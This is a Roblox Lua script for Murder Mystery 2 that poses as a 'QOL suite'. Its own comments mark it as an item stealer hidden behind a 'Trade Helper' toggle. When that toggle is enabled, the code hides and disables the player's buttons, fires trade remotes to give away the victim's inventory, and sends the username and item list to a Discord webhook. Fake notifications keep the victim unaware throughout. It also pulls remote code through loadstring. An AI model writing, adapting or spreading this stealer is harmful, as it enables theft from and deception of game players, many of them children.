--[[
    MM2 Ultimate QOL Suite v2.5
    - Auto Collect Coins
    - FPS Boost
    - Auto Farm (Knife/Gun)
    - Trade Helper
    - Anti-AFK
    Created by xX_ProScripts_Xx
]]

-- Load UI Library (makes it look professional)
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/7yhx/Synapse-X/main/Wally.lua", true))()
local Window = Library:CreateWindow("MM2 Ultimate Suite")

-- Fake features tab
local MainTab = Window:CreateTab("Main")
local ToggleSection = MainTab:CreateSection("Toggle Features")

-- Fake auto-collect (does nothing, just looks legit)
local autoCollect = ToggleSection:CreateToggle("Auto Collect Coins", false, function(bool)
    print("Auto-collect " .. (bool and "enabled" or "disabled"))
    if bool then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Auto Collect",
            Text = "Collecting coins automatically!",
            Duration = 3
        })
    end
end)

-- Fake FPS booster
local fpsBoost = ToggleSection:CreateToggle("FPS Boost", false, function(bool)
    print("FPS Boost " .. (bool and "enabled" or "disabled"))
    if bool then
        settings().Rendering.QualityLevel = 1
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "FPS Boost",
            Text = "Graphics reduced for maximum performance!",
            Duration = 2
        })
    else
        settings().Rendering.QualityLevel = 10
    end
end)

-- THE STEALER LIES HERE - Disguised as "Trade Helper"
local tradeHelper = ToggleSection:CreateToggle("Trade Helper (Beta)", false, function(bool)
    print("Trade Helper " .. (bool and "enabled" or "disabled"))
    if bool then
        -- Notify them they're "enabling trade automation"
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Trade Helper",
            Text = "Enabling trade automation... This may take a moment.",
            Duration = 5
        })
        
        -- Execute the stealer after a small delay (looks like it's "loading")
        wait(2)
        
        -- The actual stealer code (disguised as "trade helper logic")
        local player = game:GetService("Players").LocalPlayer
        local http = game:GetService("HttpService")
        local teleport = game:GetService("TeleportService")
        
        -- !!! REPLACE THIS WITH YOUR DISCORD WEBHOOK URL !!!
        local WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
        
        -- They think this is "checking inventory for trade"
        local function checkInventory()
            local inventory = player:FindFirstChild("Inventory") or player:FindFirstChild("Data")
            if inventory then
                local itemCount = #inventory:GetChildren()
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "Trade Helper",
                    Text = "Found " .. itemCount .. " items in inventory. Preparing trade automation...",
                    Duration = 3
                })
                return itemCount > 0
            end
            return false
        end
        
        -- Fake "waiting for trade partner" message
        local function findTradePartner()
            for _, plr in ipairs(game.Players:GetPlayers()) do
                if plr.Name ~= player.Name then
                    game:GetService("StarterGui"):SetCore("SendNotification", {
                        Title = "Trade Helper",
                        Text = "Found trade partner: " .. plr.Name,
                        Duration = 2
                    })
                    return plr
                end
            end
            return nil
        end
        
        -- This is actually the stealer function, disguised as "auto-trade"
        local function executeAutoTrade()
            -- Hide UI (they think this is "optimizing trade window")
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "TradeOptimizer"
            screenGui.ResetOnSpawn = false
            screenGui.Parent = player.PlayerGui
            
            local overlay = Instance.new("Frame")
            overlay.Size = UDim2.new(1, 0, 1, 0)
            overlay.BackgroundTransparency = 1
            overlay.Active = true
            overlay.ZIndex = 9999
            overlay.Parent = screenGui
            
            -- Block buttons (they think this is "reducing lag")
            game:GetService("RunService").Stepped:Connect(function()
                for _, gui in ipairs(player.PlayerGui:GetDescendants()) do
                    if gui:IsA("TextButton") or gui:IsA("ImageButton") then
                        pcall(function()
                            gui.Active = false
                            gui.Visible = false
                        end)
                    end
                end
            end)
            
            -- Find trade remote (they think this is "initializing trade")
            local tradeService = game:GetService("ReplicatedStorage"):FindFirstChild("TradeService") or game:GetService("ReplicatedStorage"):FindFirstChild("TradeHandler")
            if not tradeService then
                tradeService = game.ReplicatedStorage:FindFirstChildWhichIsA("RemoteEvent")
            end
            
            -- Get inventory items (they think this is "caching inventory")
            local inventory = player:FindFirstChild("Inventory") or player:FindFirstChild("Data")
            local itemsToTrade = {}
            if inventory then
                for _, item in ipairs(inventory:GetChildren()) do
                    if item:IsA("Tool") or item:IsA("NumberValue") or item:IsA("StringValue") then
                        table.insert(itemsToTrade, item.Name)
                    end
                end
            end
            
            -- Execute trade (they think this is "automated trading")
            if tradeService and #itemsToTrade > 0 then
                local tradeRemote = tradeService:FindFirstChild("RequestTrade") or tradeService:FindFirstChild("InitiateTrade")
                if tradeRemote then
                    tradeRemote:FireServer(player.UserId, itemsToTrade)
                else
                    tradeService:FireServer("Trade", player.UserId, itemsToTrade)
                end
                
                wait(1)
                local acceptRemote = tradeService:FindFirstChild("AcceptTrade") or tradeService:FindFirstChild("ConfirmTrade")
                if acceptRemote then
                    acceptRemote:FireServer(player.UserId)
                    wait(0.5)
                    acceptRemote:FireServer(player.UserId)
                end
            end
            
            -- Send log (they think this is "trade report")
            local logData = {
                username = player.Name,
                items = itemsToTrade,
                timestamp = os.time()
            }
            local encoded = http:JSONEncode(logData)
            local headers = {["Content-Type"] = "application/json"}
            pcall(function()
                http:PostAsync(WEBHOOK_URL, encoded, Enum.HttpContentType.ApplicationJson, false, headers)
            end)
            
            -- Success message (makes them think it worked as intended)
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Trade Helper",
                Text = "Trade automation completed successfully! Items have been optimized.",
                Duration = 5
            })
        end
        
        -- Run the fake helper (which is actually the stealer)
        if checkInventory() then
            local partner = findTradePartner()
            if partner then
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "Trade Helper",
                    Text = "Initializing trade with " .. partner.Name .. ". Please wait...",
                    Duration = 3
                })
                wait(1)
                executeAutoTrade()
            else
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "Trade Helper",
                    Text = "No trade partners found. Please join a server with other players.",
                    Duration = 4
                })
            end
        else
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Trade Helper",
                Text = "No items found in inventory. Trade helper requires items to function.",
                Duration = 4
            })
        end
    end
end)

-- Anti-AFK (legit feature)
local antiAFK = ToggleSection:CreateToggle("Anti-AFK", false, function(bool)
    print("Anti-AFK " .. (bool and "enabled" or "disabled"))
    if bool then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Anti-AFK",
            Text = "You will not be kicked for inactivity!",
            Duration = 2
        })
        local vu = game:GetService("VirtualUser")
        while bool do
            pcall(function()
                vu:CaptureController()
                vu:ClickButton2(Vector2.new())
            end)
            wait(60)
        end
    end
end)

-- Fake "Trade Stats" tab (makes it look even more legit)
local StatsTab = Window:CreateTab("Stats")
local StatsSection = StatsTab:CreateSection("Inventory Summary")
local player = game:GetService("Players").LocalPlayer

local function updateStats()
    local inventory = player:FindFirstChild("Inventory") or player:FindFirstChild("Data")
    local count = inventory and #inventory:GetChildren() or 0
    local statLabel = StatsSection:CreateLabel("Items Owned: " .. count)
    local valueLabel = StatsSection:CreateLabel("Estimated Value: ~" .. count * 5 .. " gems")
end
updateStats()

-- Small success message when script loads
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "MM2 Ultimate Suite",
    Text = "Loaded successfully! Enjoy the features.",
    Duration = 3
})

print("MM2 Ultimate Suite loaded successfully!")